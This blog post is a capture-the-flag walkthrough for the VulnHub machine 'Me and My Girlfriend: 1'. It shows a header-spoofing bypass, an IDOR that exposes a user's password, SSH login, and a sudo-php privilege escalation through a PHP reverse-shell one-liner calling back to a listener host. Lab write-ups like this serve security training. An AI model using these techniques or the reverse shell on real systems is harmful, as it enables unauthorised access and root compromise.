<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Me and My Girlfreind:1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/me-and-my-girlfreind1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-12-18T07:48:42+00:00">December 18, 2019</time><time class="updated" datetime="2025-06-10T20:10:50+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Me and My Girlfriend is another CTF challenge given by vulnhub and the level difficulty is set according to beginners. You have to hunt two flags, and this is a boot to root challenge.</span></p>
<p><span style="color: #000000;"><strong>According to author:</strong> <em>This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, ‚ÄúCeban Corp‚Äù, something has changed from Alice‚Äôs attitude towards Bob like something is ‚Äúhidden‚Äù, And Bob asks for your help to get what Alice is hiding and get full access to the company</em>.</span></p>
<p><span style="color: #000000;">Download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">here</a></strong></span>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Burp Suite</span></li>
</ul>
<p><span style="color: #000000;"><strong>Spawning shell</strong></span></p>
<ul>
<li><span style="color: #000000;">SSH</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalations</strong></span></p>
<ul>
<li><span style="color: #000000;">Sudo right</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<p><span style="color: #000000;">First of all, we try to identify our target. We did this using the netdiscover command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VP30_6vqVHk/XfnXz4MzCyI/AAAAAAAAh-8/qb9HmgnBopkpI31jznEXTg6zLrbr6m87ACLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now that we have identified our target using the above command, we can continue to our next step i.e. scanning the target‚Äôs IP to identify open ports and running services. We will use Nmap to scan the target with the following command:</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.29.148</pre>
<p><span style="color: #000000;">We found port 22, 80 are open for ssh and HTTP respectively, let‚Äôs go for enumeration.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MK9UTlXDgus/XfnX1_2_zPI/AAAAAAAAh_c/Sjh2qYAq3Rg56D8GF1ABmJxiG0a0YLHbQCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">When you will explore machine IP in the web browser, you will see a message ‚Äúthis site can only be accessed local‚Äù which is a hint given by author that means the web page will be accessible locally.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uGjmBsyGfGA/XfnX2duCEbI/AAAAAAAAh_k/-Lw_dbZpFpgxKy7iHNciwRWxQ0Bj-DsngCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Then I check for the source page and notice the comment ‚Äúto use <strong>x-forwarded-for</strong> header‚Äù to access the page, here we can say that there is a possibility of host header injection üòä.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5I3htnZ7LBs/XfnX2SDfr9I/AAAAAAAAh_g/LwjAr48vd9Qly9iAh-tAFQdl-CAugoDlgCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Without wasting time, I had edited the rule for the request header for <strong>x-forwarded-for: localhost</strong> in the burp suite and try to intercept the web page request along this.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dnKkd-zMkbw/XfnX2hvOMQI/AAAAAAAAh_o/ks3ycOz3mpsQvvZk-UxnfqjEJDf2PT7ygCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Once you have an intercepted request, further you need to forward this request again and again till you receive the response on the web browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Mi7PfpdyXd8/XfnX3WkDUII/AAAAAAAAh_s/bXVr7zS7D6oEDUatNQvUv-7pa2--_ILswCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">And finally, you will be able to access the web page for the Ceban Corp company as said by the author. On this page I saw 4 captions that contain some hyperlink. Here I tried to figure out the possibilities for SQL injection and LFI but failed to bypass this.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Dx2ngJdUzlU/XfnX30jTgxI/AAAAAAAAh_w/2QgrvL5iEdEYLr7Ms1jn5gjy5ztjTq5YQCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Since I was failed to enumerate any vulnerability, thus, register a new account by name of raj.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kCUPHsBddLA/XfnXzwUq7LI/AAAAAAAAh_A/v-WWoqeS3EwvJRzt3iBG7-0qOM6b-g-EACLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Then log in as raj to investigate further.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-z-Egy35v19k/XfnXz_UP0xI/AAAAAAAAh_E/Nrx4ECZuyl8BzXzVh2GEd9HW--voBESmgCLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Once I logged in, I saw another their three captions ‚ÄúDashboard, Profile, logout‚Äù. The profile caption denoted <strong>user_id</strong> and for raj, it is showing <strong>user-id=12</strong> in the URL.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2XiOQU1d_cU/XfnX0m71yxI/AAAAAAAAh_I/gKPoqvm1oc0kCYPG_UxiNobc62sC-sN5gCLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;">In the given URL, I tried to change user_id from user_id=12 to user-id=1 and luckily I saw the profile for another user, then frequently found the profile for alice as user_id=5, Moreover, the password field was auto filed thus I was able to read the password from inside the inspect element.</span></p>
<p><span style="color: #000000;">Thus, I have the following creds:</span></p>
<pre class="lang:default decode:true">Username: alice
Password: 4lic3</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-W_eicKMHjpQ/XfnX0n8yw9I/AAAAAAAAh_M/3IJWeDD9UDI0i_Cik9CZBq9H6syBJrExgCLcBGAsYHQ/s1600/14.png"/></span></p>
<h3><span style="color: #800000;"><strong>Spawning shell</strong></span></h3>
<p><span style="color: #000000;">Since we have enumerated credential for the user alice therefore, further I used this credential to access host machine shell through ssh.</span></p>
<pre class="lang:default decode:true">ssh alice@192.168.29.148</pre>
<p><span style="color: #000000;">After spawning the pty shell of the host machine, I looked for a directory list where I found a hidden folder named ‚Äú.my_secret‚Äù which contains two files: flag1.txt and my_notes.txt.</span></p>
<p><span style="color: #000000;">Thus, we have found 1<sup>st</sup> flag, now let‚Äôs move forward for privilege escalation and capture the 2<sup>nd</sup> flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FmMKIG15Fsk/XfnX04t4PmI/AAAAAAAAh_Q/DhSyTNs6dqQC5oL4OvN021D-9nEdTrPFwCLcBGAsYHQ/s1600/15.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Without wasting time, I looked for sudo rights and fortunately found that alice can run the php program as a sudo user. Then I start the netcat listener in a new terminal and run the php reverse shell command in the host terminal.</span></p>
<pre class="lang:default decode:true">sudo /usr/bin/php -r '$sock=fsockopen("192.168.29.157",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pxPx2jgMWQo/XfnX1b4En9I/AAAAAAAAh_U/5MzscRcUt0oLOgpn6Hweg8m-KTs934wYQCLcBGAsYHQ/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Boom!! We got the root shell through netcat session and inside the root we found the final flag.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
cd /root
ls
cat flag2.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FkkdEJAroBo/XfnX1nkFgyI/AAAAAAAAh_Y/KeEvnCGZNhck4Lo5qHItQpg17qmHe_o6gCLcBGAsYHQ/s1600/17.png"/></span></p>
<p><strong>Author</strong>: Sushma Ahuja is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on¬†<a href="https://www.linkedin.com/in/sushma-ahuja-284907157/"><strong>LinkedIn</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
